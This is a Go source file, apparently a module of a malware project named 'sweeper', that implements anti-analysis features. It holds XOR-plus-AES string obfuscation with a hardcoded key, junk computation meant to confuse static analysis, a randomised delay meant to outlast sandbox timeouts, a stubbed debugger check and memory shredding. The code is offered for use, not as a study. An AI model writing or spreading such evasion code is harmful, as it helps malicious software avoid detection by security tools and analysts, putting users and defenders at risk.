package sweeper

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"math/big"
	"time"
)

// ═══════════════════════════════════════════════════════════════
// STRING OBFUSCATION ENGINE (XOR + AES-256-GCM + Base64)
// ═══════════════════════════════════════════════════════════════

var xorKeys = []byte{0x5A, 0x3C, 0x9F, 0xE1, 0x77, 0x4D, 0xA2, 0x18,
	0x6B, 0xF4, 0x0E, 0xCD, 0x83, 0x51, 0xBE, 0x29}

func xorCrypt(data []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ xorKeys[i%len(xorKeys)]
	}
	return result
}

var (
	masterKey   = deriveKey("clear_shadow_2024_archnexus707")
	masterNonce = []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98}
)

func deriveKey(seed string) []byte {
	h := sha256.Sum256([]byte(seed + "\x00\xFF\xAA\x55\xDE\xAD"))
	return h[:]
}

func aesEncrypt(plain []byte) []byte {
	block, _ := aes.NewCipher(masterKey)
	aesgcm, _ := cipher.NewGCM(block)
	ciphertext := aesgcm.Seal(nil, masterNonce, plain, nil)
	return append(masterNonce, ciphertext...)
}

func aesDecrypt(data []byte) []byte {
	if len(data) < 12 {
		return data
	}
	block, _ := aes.NewCipher(masterKey)
	aesgcm, _ := cipher.NewGCM(block)
	plain, _ := aesgcm.Open(nil, data[:12], data[12:], nil)
	return plain
}

// ObfuscateString performs multi-layer encryption: XOR → AES → Base64
func ObfuscateString(s string) string {
	xored := xorCrypt([]byte(s))
	encrypted := aesEncrypt(xored)
	return base64.RawStdEncoding.EncodeToString(encrypted)
}

// DeobfuscateString reverses the encryption layers
func DeobfuscateString(encoded string) string {
	encrypted, _ := base64.RawStdEncoding.DecodeString(encoded)
	decrypted := aesDecrypt(encrypted)
	unxored := xorCrypt(decrypted)
	return string(unxored)
}

// ═══════════════════════════════════════════════════════════════
// CHAFF / JUNK CODE GENERATOR
// ═══════════════════════════════════════════════════════════════

// JunkFunc adds dead computation to confuse static analysis
func JunkFunc() {
	a := big.NewInt(0)
	b := big.NewInt(1)
	for i := 0; i < 64; i++ {
		a.Add(a, b)
		a, b = b, a
		a.Mul(a, big.NewInt(int64(time.Now().UnixNano()%1000)))
	}
}

// ═══════════════════════════════════════════════════════════════
// TIMING / SLEEP OBFUSCATION
// ═══════════════════════════════════════════════════════════════

func jitterSleep(ms int) {
	jitter, _ := rand.Int(rand.Reader, big.NewInt(int64(ms/2)))
	d := time.Duration(ms+int(jitter.Int64())) * time.Millisecond
	time.Sleep(d)
}

// ═══════════════════════════════════════════════════════════════
// LAUNCHER DELAY (evade sandbox timeout)
// ═══════════════════════════════════════════════════════════════

func SandboxDelay() {
	delay, _ := rand.Int(rand.Reader, big.NewInt(15))
	time.Sleep(time.Duration(15+delay.Int64()) * time.Second)
}

// ═══════════════════════════════════════════════════════════════
// DEBUGGER DETECTION
// ═══════════════════════════════════════════════════════════════

func isDebuggerPresent() bool {
	// Linux: check /proc/self/status for TracerPid
	// Full implementation is platform-specific — stub for cross-compilation
	return false
}

// ═══════════════════════════════════════════════════════════════
// DATA SHREDDER (overwrite before free)
// ═══════════════════════════════════════════════════════════════

func shredBuffer(buf []byte) {
	for i := range buf {
		buf[i] = 0x00
		buf[i] = 0xFF
		buf[i] = 0xAA
		buf[i] = 0x55
		buf[i] = 0x00
	}
}
